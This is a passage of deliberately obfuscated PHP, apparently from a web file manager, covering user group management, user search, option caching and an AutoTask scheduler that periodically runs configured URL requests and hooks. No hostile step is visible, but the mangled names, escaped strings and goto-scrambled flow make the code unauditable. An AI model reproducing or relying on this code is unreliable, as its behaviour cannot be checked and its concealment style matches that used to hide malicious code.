goto bì¹ÂŞŸ£; Aïæ¥÷è¡Å: $e×ã°Ó¹İÈ = 1; while ($e×ã°Ó¹İÈ > 1) { $e×ã°Ó¹İÈ = $e×ã°Ó¹İÈ + 4; $F•˜âÒåè = rawurlencode($e×ã°Ó¹İÈ . $eóˆùóÀöÔ[366]); } goto FŠ•ÛõÖ; FŠ•ÛõÖ: } $E±ˆŞæÊÀŞ = $this->getInfoSimple($FÑÈª—Òàå); goto fºö†±Æ†˜; eí„á§ˆÌ: } protected function userGroupAdd($DÄÏÇÎù´Œ, $a”ËªâÁÜ‘ = array()) { $d²ù¾¡ÙÅ =& $_SERVER[ºÖÙÂŒäÉê‡]; $f Ô†ÊÉ· = $this->getInfoSimple($DÄÏÇÎù´Œ); if (!$f Ô†ÊÉ· || empty($a”ËªâÁÜ‘)) { return !1; } $aßå¿ÙøÜ = array(); foreach ($a”ËªâÁÜ‘ as $aãİÏæÓŞå => $DåãÛ•Ø—Æ) { $aßå¿ÙøÜ[] = array($d²ù¾¡ÙÅ[1403] => $DÄÏÇÎù´Œ, $d²ù¾¡ÙÅ[2066] => $aãİÏæÓŞå, $d²ù¾¡ÙÅ[2194] => $DåãÛ•Ø—Æ); } return Model($d²ù¾¡ÙÅ[2140])->addAll($aßå¿ÙøÜ, array(), !0); } protected function userGroupRemove($cøÎîº‘¡, $d©š¼Ëª‡™) { $Döö¬¾æÔ‹ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Cš¶œ´¿ª¯ = $this->getInfoSimple($cøÎîº‘¡); if (!$Cš¶œ´¿ª¯ || !$d©š¼Ëª‡™) { return !1; } $b¹ «Ù¿ = array($Döö¬¾æÔ‹[1394] => $cøÎîº‘¡, $Döö¬¾æÔ‹[2138] => $d©š¼Ëª‡™); return Model($Döö¬¾æÔ‹[2140])->where($b¹ «Ù¿)->delete(); } public function listData() { $DÀ©İÃ±‡Ù = $this->_makeOrder()->selectPage(50); $this->_listDataApply($DÀ©İÃ±‡Ù[$_SERVER[ºÖÙÂŒäÉê‡][359]]); return $DÀ©İÃ±‡Ù; } public function listByID($Bœ¸Ğ£õ¢’) { $BŞ¸‚ÜŒÎ¨ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$Bœ¸Ğ£õ¢’) { return; } $b¿ÇŞ° †¯ = array($BŞ¸‚ÜŒÎ¨[1403] => array($BŞ¸‚ÜŒÎ¨[7], $Bœ¸Ğ£õ¢’)); $fÏÀÎ–†‹ã = $this->where($b¿ÇŞ° †¯)->select(); $this->_listDataApply($fÏÀÎ–†‹ã); return $fÏÀÎ–†‹ã; } public function listByGroup($A˜Ã¯‰µ¸ˆ = 0, $eë‚ù¿Í» = array()) { goto EÒÕ›†“¤õ; c‹ÉÒÊ¶Ü: if ($A˜Ã¯‰µ¸ˆ) { $E…ˆÂ«ÍŞÚ = array($Bº™ğÓ³Â…[2482] => intval($A˜Ã¯‰µ¸ˆ)); $CÔÒÖê® = "\114\x45\x46\124\40\112\117\111\x4e\x20{$this->tablePrefix}\x75\163\145\x72\137\147\162\157\165\x70\x20\x75\163\x65\162\137\x67\162\157\165\160\x20\157\156\x20\x75\163\x65\162\x2e\165\x73\x65\162\x49\104\40\75\x20\165\163\x65\162\x5f\x67\162\x6f\165\160\56\165\x73\x65\162\x49\x44"; $eõ¬É¸­² = Input::get($Bº™ğÓ³Â…[411], null, $Bº™ğÓ³Â…[33]) ? $Bº™ğÓ³Â…[33] : $Bº™ğÓ³Â…[2483]; } if (isset($eë‚ù¿Í»[$Bº™ğÓ³Â…[686]])) { $E…ˆÂ«ÍŞÚ[$Bº™ğÓ³Â…[2484]] = $eë‚ù¿Í»[$Bº™ğÓ³Â…[686]]; } $fÏÎİ™ƒåç = $this->_makeOrder($eõ¬É¸­²)->field($Bº™ğÓ³Â…[2485])->where($E…ˆÂ«ÍŞÚ)->join($CÔÒÖê®)->selectPage(50); goto F£È³ÓÂ°‡; F£È³ÓÂ°‡: $this->_listDataApply($fÏÎİ™ƒåç[$Bº™ğÓ³Â…[359]]); return $fÏÎİ™ƒåç; goto bµÅñ‰Í‡È; EÒÕ›†“¤õ: $Bº™ğÓ³Â… =& $_SERVER[ºÖÙÂŒäÉê‡]; $CÔÒÖê® = $Bº™ğÓ³Â…[33]; $E…ˆÂ«ÍŞÚ = array(); goto c‹ÉÒÊ¶Ü; bµÅñ‰Í‡È: } private function _makeOrder($e…ªÃÓª = '') { goto CœšğöÏ…¤; C—Ò•Õ”óï: $eíÓêõï´Ô = Input::get($d£Ï¯…òÄ¿[411], $d£Ï¯…òÄ¿[7], $d£Ï¯…òÄ¿[1394], $b·¹²òÓõ); $f‚Ô®·ÃÀÊ = Input::get($d£Ï¯…òÄ¿[412], $d£Ï¯…òÄ¿[7], $d£Ï¯…òÄ¿[2141], array($d£Ï¯…òÄ¿[2141], $d£Ï¯…òÄ¿[408])); $f‚Ô®·ÃÀÊ = $aª©Û¬Û[$f‚Ô®·ÃÀÊ]; goto a¢£¤‡÷ë˜; CœšğöÏ…¤: $d£Ï¯…òÄ¿ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b·¹²òÓõ = array($d£Ï¯…òÄ¿[1403], $d£Ï¯…òÄ¿[28], $d£Ï¯…òÄ¿[2052], $d£Ï¯…òÄ¿[2025], $d£Ï¯…òÄ¿[193]); $aª©Û¬Û = array($d£Ï¯…òÄ¿[406] => $d£Ï¯…òÄ¿[407], $d£Ï¯…òÄ¿[408] => $d£Ï¯…òÄ¿[409]); goto C—Ò•Õ”óï; a¢£¤‡÷ë˜: $e…ªÃÓª = $e…ªÃÓª . "\x75\x73\145\x72\56{$eíÓêõï´Ô}\x20{$f‚Ô®·ÃÀÊ}\x2c\x20\x75\163\x65\162\x2e\165\163\145\x72\x49\x44\40\x61\163\143"; return $this->alias($d£Ï¯…òÄ¿[2227])->order($e…ªÃÓª); goto aÖ¶ŸêÂ¨“; aÖ¶ŸêÂ¨“: } public function listSearch($DêêˆÈ¶) { goto CÄ”å˜¤—Ÿ; déÙŠ³ÃÜ: if (!$A…Ææİ¢šì) { $Eõ–äÑ³ = array(); } if (isset($DêêˆÈ¶[$Aö« îÁ¬ç[686]])) { $Eõ–äÑ³[$Aö« îÁ¬ç[686]] = $DêêˆÈ¶[$Aö« îÁ¬ç[686]]; } $d…™‹‚Õôö = $this->_makeOrder()->where($Eõ–äÑ³)->selectPage(20); goto eâĞÙ‰Òï±; eâĞÙ‰Òï±: if (!$d…™‹‚Õôö || count($d…™‹‚Õôö[$Aö« îÁ¬ç[359]]) < 5 && Input::check($A…Ææİ¢šì, $Aö« îÁ¬ç[311])) { $E©ÇÈÙ˜ÚÄ = $this->_searchFromMeta($Aö« îÁ¬ç[419], $A…Ææİ¢šì, 10); $dÉëãÊ²ª¯ = $this->_searchFromMeta($Aö« îÁ¬ç[420], $A…Ææİ¢šì, 10); $bçëßÕÄæÛ = array_merge($E©ÇÈÙ˜ÚÄ, $dÉëãÊ²ª¯, $d…™‹‚Õôö[$Aö« îÁ¬ç[359]]); $d…™‹‚Õôö[$Aö« îÁ¬ç[359]] = array_unique_by_key($bçëßÕÄæÛ, $Aö« îÁ¬ç[1403]); $d…™‹‚Õôö[$Aö« îÁ¬ç[356]][$Aö« îÁ¬ç[357]] = count($d…™‹‚Õôö[$Aö« îÁ¬ç[359]]); $d…™‹‚Õôö[$Aö« îÁ¬ç[356]][$Aö« îÁ¬ç[358]] = ceil($d…™‹‚Õôö[$Aö« îÁ¬ç[356]][$Aö« îÁ¬ç[357]] / $d…™‹‚Õôö[$Aö« îÁ¬ç[356]][$Aö« îÁ¬ç[354]]); } $this->_listDataApply($d…™‹‚Õôö[$Aö« îÁ¬ç[359]]); $this->_filterByGroup($d…™‹‚Õôö, $Eİà´ÆÙìË); goto Cğ‡­·Š­ù; a°‹›Æè××: $A…Ææİ¢šì = str_replace($Aö« îÁ¬ç[2144], $Aö« îÁ¬ç[2145], trim($A…Ææİ¢šì)); $Eõ–äÑ³ = array($Aö« îÁ¬ç[28] => array($Aö« îÁ¬ç[750], "\45{$A…Ææİ¢šì}\x25"), $Aö« îÁ¬ç[298] => array($Aö« îÁ¬ç[750], "\x25{$A…Ææİ¢šì}\x25"), $Aö« îÁ¬ç[2286] => array($Aö« îÁ¬ç[750], "\x25{$A…Ææİ¢šì}\45"), $Aö« îÁ¬ç[906] => $Aö« îÁ¬ç[2146]); if (Input::check($A…Ææİ¢šì, $Aö« îÁ¬ç[304])) { $Eõ–äÑ³[$Aö« îÁ¬ç[1403]] = array($Aö« îÁ¬ç[750], "\x25{$A…Ææİ¢šì}\x25"); $Eõ–äÑ³[$Aö« îÁ¬ç[2465]] = array($Aö« îÁ¬ç[750], "\x25{$A…Ææİ¢šì}\x25"); } goto déÙŠ³ÃÜ; Cğ‡­·Š­ù: return $d…™‹‚Õôö; goto F¢éÑ‰©©; CÄ”å˜¤—Ÿ: $Aö« îÁ¬ç =& $_SERVER[ºÖÙÂŒäÉê‡]; $A…Ææİ¢šì = $DêêˆÈ¶[$Aö« îÁ¬ç[2142]]; $Eİà´ÆÙìË = isset($DêêˆÈ¶[$Aö« îÁ¬ç[2143]]) ? $DêêˆÈ¶[$Aö« îÁ¬ç[2143]] : !1; goto a°‹›Æè××; F¢éÑ‰©©: } private function _filterByGroup(&$b™–éÏ™ßÛ, $BîÒ‘´•ó‘) { $b˜«éó·ë… =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$BîÒ‘´•ó‘) { return $b™–éÏ™ßÛ; } foreach ($b™–éÏ™ßÛ[$b˜«éó·ë…[359]] as $A£İÛ‚¹Á˜ => &$a“¯ˆÅ°òã) { $B‰‰ÄÜº = array_to_keyvalue($a“¯ˆÅ°òã[$b˜«éó·ë…[2486]], $b˜«éó·ë…[33], $b˜«éó·ë…[2066]); if (!in_array($BîÒ‘´•ó‘, $B‰‰ÄÜº)) { unset($b™–éÏ™ßÛ[$b˜«éó·ë…[359]][$A£İÛ‚¹Á˜]); } } $b™–éÏ™ßÛ[$b˜«éó·ë…[359]] = array_values($b™–éÏ™ßÛ[$b˜«éó·ë…[359]]); $b™–éÏ™ßÛ[$b˜«éó·ë…[356]] = array($b˜«éó·ë…[2261] => count($b™–éÏ™ßÛ[$b˜«éó·ë…[359]]), $b˜«éó·ë…[2259] => $b™–éÏ™ßÛ[$b˜«éó·ë…[356]][$b˜«éó·ë…[354]], $b˜«éó·ë…[2258] => 1, $b˜«éó·ë…[2260] => 1); } private function _searchFromMeta($F†«â‡±Ò·, $F½Æ®àŠÎ, $fœ˜³ğ¬¾Ä) { goto B›³õ±Õ³; f™âí›ñ·: $bñ–ø¼…«Â = $this->where(array($A«Í¿ƒäİ[1394] => array($A«Í¿ƒäİ[7], $d£”¡œÀ”´)))->select(); if (!$bñ–ø¼…«Â) { return array(); } return $bñ–ø¼…«Â; goto B¶òÍäÁ²ó; B›³õ±Õ³: $A«Í¿ƒäİ =& $_SERVER[ºÖÙÂŒäÉê‡]; $F½Æ®àŠÎ = strtolower($F½Æ®àŠÎ); $A’ÇÃâ˜ŞÊ = array($A«Í¿ƒäİ[89] => $F†«â‡±Ò·, $A«Í¿ƒäİ[364] => array($A«Í¿ƒäİ[750], "\x25{$F½Æ®àŠÎ}\45")); goto a“õ„ÛÓË; a“õ„ÛÓË: $d£”¡œÀ”´ = Model($A«Í¿ƒäİ[2487])->where($A’ÇÃâ˜ŞÊ)->limit($fœ˜³ğ¬¾Ä)->select(); if (!$d£”¡œÀ”´) { return array(); } $d£”¡œÀ”´ = array_to_keyvalue($d£”¡œÀ”´, $A«Í¿ƒäİ[33], $A«Í¿ƒäİ[1403]); goto f™âí›ñ·; B¶òÍäÁ²ó: } private function _listDataApplyItem($f«ÁšªŠ) { $dó©»Œ—æë = array($f«ÁšªŠ); $this->_listDataApply($dó©»Œ—æë); return $dó©»Œ—æë[0]; } private function _listDataApply(&$DçÆºÉššê) { goto b¨¶ÉŒÄÓ; b¨¶ÉŒÄÓ: $AÙß¾¿ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$DçÆºÉššê) { return; } array_remove_key($DçÆºÉššê, $AÙß¾¿[794]); goto CÎ£ÅîäÇ; CÎ£ÅîäÇ: $BÛ¹¡®ƒ»¼ = array_to_keyvalue($DçÆºÉššê, $AÙß¾¿[33], $AÙß¾¿[1403]); $this->_listAppendGroup($DçÆºÉššê, $BÛ¹¡®ƒ»¼); $this->_listAppendMeta($DçÆºÉššê, $BÛ¹¡®ƒ»¼); goto aÎà·Øøíï; aÎà·Øøíï: $this->_listAppendSourceRoot($DçÆºÉššê, $BÛ¹¡®ƒ»¼); goto C‡Ğè«¶ â; C‡Ğè«¶ â: } private function _listAppendSourceRoot(&$E³é—Š”Ê˜, $Aœ¦Ïë¢¼¡) { goto aÜ¥Ä¬¾Ê’; D¦ŠöÒºó×: $b„ëÏ¼¥·á = Model($b¼æ‚ £Æå[751])->order($b¼æ‚ £Æå[2153])->field($e„Úİ§µ¦ñ)->where($DšÅ¬™å—Š)->select(); $b„ëÏ¼¥·á = array_to_keyvalue($b„ëÏ¼¥·á, $b¼æ‚ £Æå[460]); $b„ëÏ¼¥·á = array_remove_key($b„ëÏ¼¥·á, $b¼æ‚ £Æå[460]); goto dˆºÇÌÈŠ; dˆºÇÌÈŠ: foreach ($E³é—Š”Ê˜ as &$FÂñá—°ó™) { $FÂñá—°ó™[$b¼æ‚ £Æå[396]] = $b„ëÏ¼¥·á[$FÂñá—°ó™[$b¼æ‚ £Æå[1403]]] ? $b„ëÏ¼¥·á[$FÂñá—°ó™[$b¼æ‚ £Æå[1403]]] : array(); } goto E‰“çÉ‚¾ã; aÜ¥Ä¬¾Ê’: $b¼æ‚ £Æå =& $_SERVER[ºÖÙÂŒäÉê‡]; $DšÅ¬™å—Š = array($b¼æ‚ £Æå[465] => 0, $b¼æ‚ £Æå[376] => SourceModel::TYPE_USER, $b¼æ‚ £Æå[460] => array($b¼æ‚ £Æå[7], $Aœ¦Ïë¢¼¡)); $e„Úİ§µ¦ñ = $b¼æ‚ £Æå[2152]; goto D¦ŠöÒºó×; E‰“çÉ‚¾ã: } private function _listAppendGroup(&$aÚ„ËÅ‹…÷, $cÇ˜ò–’„ˆ) { goto Dêë®½Ä‚ã; C´š‹÷Ê—: $FºØôä¢ĞÈ = array_to_keyvalue_group($FºØôä¢ĞÈ, $DìÌç¹¨[1403]); foreach ($FºØôä¢ĞÈ as &$D­Ñ¸³‘‹İ) { $Fá… ¹ô£î = array(); foreach ($D­Ñ¸³‘‹İ as $dÊ†Û’·ø³) { if (!$dÊ†Û’·ø³[$DìÌç¹¨[2194]]) { continue; } $D…ò¬ÔèÃ = Model($DìÌç¹¨[2213])->listData($dÊ†Û’·ø³[$DìÌç¹¨[2194]]); $Fá… ¹ô£î[] = array($DìÌç¹¨[2066] => $dÊ†Û’·ø³[$DìÌç¹¨[2066]], $DìÌç¹¨[2490] => $CÍŠä’÷§ê[$dÊ†Û’·ø³[$DìÌç¹¨[2066]]], $DìÌç¹¨[381] => $D…ò¬ÔèÃ); } $D­Ñ¸³‘‹İ = $Fá… ¹ô£î; } foreach ($aÚ„ËÅ‹…÷ as &$CµëÊÈ¦È…) { $CµëÊÈ¦È…[$DìÌç¹¨[2486]] = array(); if (isset($FºØôä¢ĞÈ[$CµëÊÈ¦È…[$DìÌç¹¨[1403]]])) { $CµëÊÈ¦È…[$DìÌç¹¨[2486]] = $FºØôä¢ĞÈ[$CµëÊÈ¦È…[$DìÌç¹¨[1403]]]; } } goto FÁ˜õ´é½; EÑñëƒ…ñŠ: $a™šÍ´­• = array($DìÌç¹¨[2066] => array($DìÌç¹¨[7], $aéÈº÷¾»‘)); $D•‹¢ÚØÖ‡ = Model($DìÌç¹¨[2488])->field($DìÌç¹¨[2489])->where($a™šÍ´­•)->select(); $CÍŠä’÷§ê = array_to_keyvalue($D•‹¢ÚØÖ‡, $DìÌç¹¨[2066], $DìÌç¹¨[28]); goto C´š‹÷Ê—; Dº´ŸÙ õ¥: $aéÈº÷¾»‘ = array_to_keyvalue($FºØôä¢ĞÈ, $DìÌç¹¨[33], $DìÌç¹¨[2066]); $aéÈº÷¾»‘ = array_remove_value(array_unique($aéÈº÷¾»‘), $DìÌç¹¨[472]); if (!$aéÈº÷¾»‘ || !$FºØôä¢ĞÈ) { return; } goto EÑñëƒ…ñŠ; Dêë®½Ä‚ã: $DìÌç¹¨ =& $_SERVER[ºÖÙÂŒäÉê‡]; $a™šÍ´­• = array($DìÌç¹¨[1403] => array($DìÌç¹¨[7], $cÇ˜ò–’„ˆ)); $FºØôä¢ĞÈ = Model($DìÌç¹¨[2140])->where($a™šÍ´­•)->select(); goto Dº´ŸÙ õ¥; FÁ˜õ´é½: } private function _listAppendMeta(&$d¯´‘ÂÇ…ë, $AÆ¼ó£à”‡) { goto c±ÑêÛ¢Ú«; c±ÑêÛ¢Ú«: $dÖÔ¥ù¾æ‹ =& $_SERVER[ºÖÙÂŒäÉê‡]; $D“‡¦åÊ˜£ = UserJobModel::JOB_KEY; $Dé˜£ù‡‰¹ = array($dÖÔ¥ù¾æ‹[2467]); goto c¹“ øó±”; C»·Îí´‘Ÿ: foreach ($Fİœª©‡³² as &$F¼¦¼ˆ”÷‹) { $EĞö³Èéïá = array(); foreach ($F¼¦¼ˆ”÷‹ as $BÃÄ©í½ñ¶) { if (!in_array($BÃÄ©í½ñ¶[$dÖÔ¥ù¾æ‹[89]], $Dé˜£ù‡‰¹)) { $EĞö³Èéïá[$BÃÄ©í½ñ¶[$dÖÔ¥ù¾æ‹[89]]] = $BÃÄ©í½ñ¶[$dÖÔ¥ù¾æ‹[364]]; } } $F¼¦¼ˆ”÷‹ = $EĞö³Èéïá; } $CÚ‘„ÄÂ¤¬ = Model($dÖÔ¥ù¾æ‹[2491]); foreach ($d¯´‘ÂÇ…ë as &$cª¡×ãÏŠ) { $eŸ®“Í°Û£ = array(); if (isset($Fİœª©‡³²[$cª¡×ãÏŠ[$dÖÔ¥ù¾æ‹[1403]]])) { $eŸ®“Í°Û£ = $Fİœª©‡³²[$cª¡×ãÏŠ[$dÖÔ¥ù¾æ‹[1403]]]; } $cª¡×ãÏŠ[$dÖÔ¥ù¾æ‹[2492]] = array(); if (isset($eŸ®“Í°Û£[$D“‡¦åÊ˜£])) { $cª¡×ãÏŠ[$dÖÔ¥ù¾æ‹[2492]] = $CÚ‘„ÄÂ¤¬->getUserJobInfo($eŸ®“Í°Û£[$D“‡¦åÊ˜£]); } } goto fÙ³˜™¨ÌÌ; c¹“ øó±”: $DàÀ´“è‡ƒ = array($dÖÔ¥ù¾æ‹[1403] => array($dÖÔ¥ù¾æ‹[7], $AÆ¼ó£à”‡)); $Fİœª©‡³² = Model($dÖÔ¥ù¾æ‹[2464])->where($DàÀ´“è‡ƒ)->select(); $Fİœª©‡³² = array_to_keyvalue_group($Fİœª©‡³², $dÖÔ¥ù¾æ‹[1403]); goto C»·Îí´‘Ÿ; fÙ³˜™¨ÌÌ: } public function userSearch($b“ÇÜä—Å¥, $EÈ³ìğÑª = "\52") { return Model($_SERVER[ºÖÙÂŒäÉê‡][481])->where($b“ÇÜä—Å¥)->field($EÈ³ìğÑª)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\x5f\x6f\x70\x74\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($DŸƒ‚åŸ•) { $f‡„çÕã»– =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!defined($f‡„çÕã»–[431])) { define($f‡„çÕã»–[431], 0); } return "\x55\x73\145\x72\117\160\x74\x69\157\x6e\x5f{$DŸƒ‚åŸ•}\137" . USER_ID; } protected function filterWhere($CĞŠ…×öá») { $C—–ß»ê¿ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!defined($C—–ß»ê¿[431])) { define($C—–ß»ê¿[431], 0); } $CĞŠ…×öá»[$C—–ß»ê¿[1403]] = USER_ID; return $CĞŠ…×öá»; } public function cacheRemoveUser($A£äÇÚÒ‘æ, $Dêºèâ±Šß) { return Cache::remove("\x55\x73\x65\162\x4f\160\164\x69\x6f\156\x5f{$A£äÇÚÒ‘æ}\x5f" . $Dêºèâ±Šß); } protected function optionDefault($EùšÀ»÷é“ = '') { $AöÛ×âÖ‚ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($EùšÀ»÷é“ == $AöÛ×âÖ‚[33]) { return $GLOBALS[$AöÛ×âÖ‚[6]][$AöÛ×âÖ‚[2493]]; } if ($EùšÀ»÷é“ == $AöÛ×âÖ‚[2494]) { return $GLOBALS[$AöÛ×âÖ‚[6]][$AöÛ×âÖ‚[2495]]; } } } goto a¢©Ïè°±™; c°øŞÕ•ÖË: class AutoTask { public static function start() { goto D¯õ’Ë¢•ù; aØéë…–Å: http_close(); self::valueSet($C¬Ÿ¡„«Õâ[1367], $C¬Ÿ¡„«Õâ[83]); Hook::bind($C¬Ÿ¡„«Õâ[1369], $C¬Ÿ¡„«Õâ[1370]); goto B»‡¿à½ÜÇ; B»‡¿à½ÜÇ: while (!0) { self::cacheClear(); if (self::valueGet($C¬Ÿ¡„«Õâ[686]) != $C¬Ÿ¡„«Õâ[83]) { self::valueSet($C¬Ÿ¡„«Õâ[1367], $C¬Ÿ¡„«Õâ[472]); self::log($C¬Ÿ¡„«Õâ[1371]); die; } self::valueSet($C¬Ÿ¡„«Õâ[1367], $C¬Ÿ¡„«Õâ[83]); self::valueSet($C¬Ÿ¡„«Õâ[1368], time()); self::taskRunAll(); sleep(self::valueGet($C¬Ÿ¡„«Õâ[1372])); } goto e¦‡´Òä†³; D¯õ’Ë¢•ù: $C¬Ÿ¡„«Õâ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (self::valueGet($C¬Ÿ¡„«Õâ[686]) != $C¬Ÿ¡„«Õâ[83]) { return; } if (self::valueGet($C¬Ÿ¡„«Õâ[1367]) == $C¬Ÿ¡„«Õâ[83]) { $a¿Œµß– = self::valueGet($C¬Ÿ¡„«Õâ[1368]); if (time() - $a¿Œµß– > 3600 * 2) { self::restart(); } return; } goto aØéë…–Å; e¦‡´Òä†³: } public static function restart() { $Aù¶à›ÃÌÓ =& $_SERVER[ºÖÙÂŒäÉê‡]; http_close(); self::valueSet($Aù¶à›ÃÌÓ[686], $Aù¶à›ÃÌÓ[472]); sleep(self::valueGet($Aù¶à›ÃÌÓ[1372]) + 5); self::valueSet($Aù¶à›ÃÌÓ[1367], $Aù¶à›ÃÌÓ[472]); self::valueSet($Aù¶à›ÃÌÓ[686], $Aù¶à›ÃÌÓ[83]); } public static function shutdownEvent() { $fÄ½‰”Êº =& $_SERVER[ºÖÙÂŒäÉê‡]; self::valueSet($fÄ½‰”Êº[1367], $fÄ½‰”Êº[472]); self::log($fÄ½‰”Êº[1373]); } public static function config($D‘À…Ó¯áµ, $EË´±×¶­„) { $AÔ¸İ‚ÁÇÎ =& $_SERVER[ºÖÙÂŒäÉê‡]; $eÆ«±‰”ÙÇ = 20; $EË´±×¶­„ = intval($EË´±×¶­„) <= $eÆ«±‰”ÙÇ ? $eÆ«±‰”ÙÇ : intval($EË´±×¶­„); self::valueSet($AÔ¸İ‚ÁÇÎ[686], $D‘À…Ó¯áµ); self::valueSet($AÔ¸İ‚ÁÇÎ[1372], $EË´±×¶­„); } private static function taskRunAll() { $b“Ú“œªï” =& $_SERVER[ºÖÙÂŒäÉê‡]; $BÊ‡ÈÊ”½¹ = Model($b“Ú“œªï”[1374])->listData(); $E†ºö…¯ä– = count($BÊ‡ÈÊ”½¹); for ($dëÑ¤ŒÛÆˆ = 0; $dëÑ¤ŒÛÆˆ < $E†ºö…¯ä–; $dëÑ¤ŒÛÆˆ++) { $C¢˜¿“æ‚ = $BÊ‡ÈÊ”½¹[$dëÑ¤ŒÛÆˆ]; if ($C¢˜¿“æ‚[$b“Ú“œªï”[1375]] != $b“Ú“œªï”[83]) { continue; } if (!self::taskTimeCheck($C¢˜¿“æ‚)) { continue; } self::taskRun($C¢˜¿“æ‚); } Hook::trigger($b“Ú“œªï”[1376]); } private static function taskTimeCheck($aµŒá…ô×) { goto B²ƒ’¡¹¶á; B²ƒ’¡¹¶á: $EÑÑ°’• =& $_SERVER[ºÖÙÂŒäÉê‡]; $A÷©á‘ÇÒ = json_decode($aµŒá…ô×[$EÑÑ°’•[196]], !0); $DØÏ†ÆÎ = intval($aµŒá…ô×[$EÑÑ°’•[1368]]); goto BÂ¬¤–®“œ; BÂ¬¤–®“œ: $BÇê¯ÃäÖİ = strtotime($EÑÑ°’•[1377] . $A÷©á‘ÇÒ[$EÑÑ°’•[1378]] . $EÑÑ°’•[1379]) - strtotime($EÑÑ°’•[1380]); $a¹é‹–¯ = time() - strtotime(date($EÑÑ°’•[1381]) . $EÑÑ°’•[1382]); $eöºÇŞŸ×´ = $a¹é‹–¯ >= $BÇê¯ÃäÖİ && $a¹é‹–¯ <= $BÇê¯ÃäÖİ + 3600; goto Dæ‰±ÚÂ‡; Dæ‰±ÚÂ‡: switch ($A÷©á‘ÇÒ[$EÑÑ°’•[29]]) { case $EÑÑ°’•[1383]: if (time() - $DØÏ†ÆÎ < 3600 * 24 * 30) { return !1; } if ($A÷©á‘ÇÒ[$EÑÑ°’•[1383]] == date($EÑÑ°’•[1384]) && $eöºÇŞŸ×´) { return !0; } break; case $EÑÑ°’•[1385]: if (time() - $DØÏ†ÆÎ < 3600 * 24 * 7) { return !1; } $cìÛ¼¹³Ïç = date($EÑÑ°’•[1386]) == 0 ? 7 : date($EÑÑ°’•[1386]); if ($A÷©á‘ÇÒ[$EÑÑ°’•[1385]] == $cìÛ¼¹³Ïç && $eöºÇŞŸ×´) { return !0; } break; case $EÑÑ°’•[1378]: if (time() - $DØÏ†ÆÎ < 3600 * 24) { return !1; } if ($eöºÇŞŸ×´) { return !0; } break; case $EÑÑ°’•[1387]: if (time() - $DØÏ†ÆÎ >= floatval($A÷©á‘ÇÒ[$EÑÑ°’•[1387]]) * 60) { return !0; } break; default: break; } return !1; goto E¹×¥ñ¿Õù; E¹×¥ñ¿Õù: } public static function taskRun($Cïª–ÏãñÒ) { goto eÈïÒçâùì; b‘ò¯¤´¾‘: $câ…ÈéøŸŞ = timeFloat(); $c‹ô Ë²õË = $AÚñà¨£Œù[33]; switch ($Cïª–ÏãñÒ[$AÚñà¨£Œù[29]]) { case $AÚñà¨£Œù[300]: $a‘ˆ™²ƒ÷“ = url_request($Cïª–ÏãñÒ[$AÚñà¨£Œù[1391]], $AÚñà¨£Œù[222], !1, !1, !1, !1, 5); $c‹ô Ë²õË = strlen($a‘ˆ™²ƒ÷“); break; case $AÚñà¨£Œù[221]: $c‹ô Ë²õË = Hook::apply($Cïª–ÏãñÒ[$AÚñà¨£Œù[1391]]); default: break; } goto Cƒ‚ŠªÌé; Cƒ‚ŠªÌé: Model($AÚñà¨£Œù[1392])->add(array($AÚñà¨£Œù[1393] => $AÚñà¨£Œù[33], $AÚñà¨£Œù[1394] => $AÚñà¨£Œù[472], $AÚñà¨£Œù[29] => $AÚñà¨£Œù[1395] . $Cïª–ÏãñÒ[$AÚñà¨£Œù[372]], $AÚñà¨£Œù[1396] => json_encode(array($AÚñà¨£Œù[28] => $Cïª–ÏãñÒ[$AÚñà¨£Œù[28]], $AÚñà¨£Œù[1397] => timeFloat() - $câ…ÈéøŸŞ, $AÚñà¨£Œù[286] => $c‹ô Ë²õË)))); self::log($AÚñà¨£Œù[1398] . $Cïª–ÏãñÒ[$AÚñà¨£Œù[372]] . $AÚñà¨£Œù[1399] . $c‹ô Ë²õË); return !0; goto FÏíé‡»…¸; eÈïÒçâùì: $AÚñà¨£Œù =& $_SERVER[ºÖÙÂŒäÉê‡]; self::log($AÚñà¨£Œù[1388] . $Cïª–ÏãñÒ[$AÚñà¨£Œù[372]] . $AÚñà¨£Œù[1389] . $Cïª–ÏãñÒ[$AÚñà¨£Œù[28]] . $AÚñà¨£Œù[1390] . $Cïª–ÏãñÒ[$AÚñà¨£Œù[1391]]); Model($AÚñà¨£Œù[1374])->run($Cïª–ÏãñÒ[$AÚñà¨£Œù[372]]); goto b‘ò¯¤´¾‘; FÏíé‡»…¸: } private static function valueGet($aîÈæ–‰®—) { $fÊÂ¢­ë¢Ò =& $_SERVER[ºÖÙÂŒäÉê‡]; $D¶“Œ‹¨ˆ¹ = $fÊÂ¢­ë¢Ò[1400]; $fÒá ´ß¨ = Model($fÊÂ¢­ë¢Ò[1401])->get($aîÈæ–‰®—, $D¶“Œ‹¨ˆ¹); if (is_null($fÒá ´ß¨)) { Model($fÊÂ¢­ë¢Ò[1401])->set($fÊÂ¢­ë¢Ò[1372], 10, $D¶“Œ‹¨ˆ¹); Model($fÊÂ¢­ë¢Ò[1401])->set($fÊÂ¢­ë¢Ò[686], $fÊÂ¢­ë¢Ò[83], $D¶“Œ‹¨ˆ¹); Model($fÊÂ¢­ë¢Ò[1401])->set($fÊÂ¢­ë¢Ò[1367], $fÊÂ¢­ë¢Ò[472], $D¶“Œ‹¨ˆ¹); $fÒá ´ß¨ = Model($fÊÂ¢­ë¢Ò[1401])->get($aîÈæ–‰®—, $D¶“Œ‹¨ˆ¹); } return $fÒá ´ß¨; } private static function valueSet($EÏ¯Òåç«, $fÄ®´ÃÆ÷¤) { $eØŒš¨¦­ =& $_SERVER[ºÖÙÂŒäÉê‡]; return Model($eØŒš¨¦­[1401])->set($EÏ¯Òåç«, $fÄ®´ÃÆ÷¤, $eØŒš¨¦­[1400]); } protected static function log($fË™’¿ìÛ) { write_log($fË™’¿ìÛ, $_SERVER[ºÖÙÂŒäÉê‡][1402]); } private static function cacheClear() { $C„ê™ìà¯ˆ =& 